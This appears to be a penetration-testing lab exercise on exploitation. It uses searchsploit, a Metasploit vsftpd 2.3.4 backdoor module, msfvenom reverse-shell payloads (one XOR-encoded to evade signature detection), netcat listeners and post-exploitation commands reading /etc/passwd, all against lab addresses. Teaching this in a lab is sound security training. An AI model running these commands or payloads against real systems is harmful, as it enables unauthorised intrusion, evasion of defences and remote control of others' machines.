## 📖 Background

Exploitation is the act of leveraging a vulnerability to achieve an unauthorized effect on a target system — typically remote code execution, but also information disclosure, denial of service, or privilege escalation. A disciplined exploitation workflow minimizes collateral damage and maximizes reliability.

Key concepts:
- **Vulnerability** — A weakness in software, configuration, or logic
- **Exploit** — Code that takes advantage of a vulnerability
- **Payload** — The code delivered through an exploit (e.g., a reverse shell)
- **Bind Shell vs. Reverse Shell** — Bind listens on the target; reverse connects back to the attacker
- **Staged vs. Stageless Payloads** — Staged sends a small loader first; stageless is self-contained
- **Exploit Reliability** — Not every exploit works every time; version and configuration matter

## 🔬 Lab Instructions

### Phase 1: Vulnerability Research

1. Use searchsploit to find exploits for a discovered service:
   ```bash
   searchsploit vsftpd 2.3.4
   searchsploit apache 2.4
   searchsploit -w samba 3.0    # Show Exploit-DB URLs
   ```
2. Read the exploit code to understand what it does:
   ```bash
   searchsploit -x exploits/unix/remote/49757.py
   ```
3. Cross-reference with CVE databases for severity and impact:
   ```bash
   searchsploit --cve 2021-3156
   ```
4. Identify at least two exploitable services from your LAB-010 scan results
5. Document each vulnerability: CVE, affected version, exploit type, reliability

### Phase 2: Metasploit Basics

1. Launch Metasploit and search for relevant modules:
   ```bash
   msfconsole -q
   search vsftpd
   search type:exploit platform:linux apache
   ```
2. Select and configure an exploit module:
   ```
   use exploit/unix/ftp/vsftpd_234_backdoor
   show options
   set RHOSTS 10.10.10.50
   set RPORT 21
   ```
3. Select a payload appropriate for the target:
   ```
   show payloads
   set payload cmd/unix/interact
   ```
4. Validate settings and launch the exploit:
   ```
   check
   exploit
   ```
5. Interact with the resulting session and verify access:
   ```
   sessions -l
   sessions -i 1
   whoami
   id
   hostname
   ```

### Phase 3: Payload Generation with msfvenom

1. Generate a Linux reverse shell payload:
   ```bash
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -f elf -o reverse_shell.elf
   ```
2. Generate a Python-based payload for flexibility:
   ```bash
   msfvenom -p cmd/unix/reverse_python LHOST=10.10.10.5 LPORT=4444 -o payload.py
   ```
3. Encode a payload to evade basic signature detection:
   ```bash
   msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.10.5 LPORT=4444 -e x64/xor -i 3 -f elf -o encoded_shell.elf
   ```
4. Set up a listener to catch the reverse connection:
   ```bash
   nc -lvnp 4444
   ```
5. Transfer the payload to the target and execute it to verify the connection

### Phase 4: Manual Exploitation

1. Select a vulnerability and exploit it without Metasploit
2. Download a public exploit script from Exploit-DB:
   ```bash
   searchsploit -m exploits/unix/remote/49757.py
   ```
3. Review the exploit source code for safety and correctness
4. Modify target-specific parameters (IP, port, offsets):
   ```bash
   python3 49757.py 10.10.10.50 21
   ```
5. Set up a manual netcat listener for the reverse shell:
   ```bash
   nc -lvnp 4444
   ```
6. Compare the manual approach with the Metasploit module for reliability and control

### Phase 5: Post-Exploitation Verification

1. Once you have a shell, confirm access level:
   ```bash
   whoami && id && uname -a
   ```
2. Identify the compromised system's role in the network:
   ```bash
   ip addr && cat /etc/hostname && cat /etc/passwd | head -5
   ```
3. Document the full attack chain: vulnerability → exploit → payload → shell
4. Clean up any artifacts left during exploitation
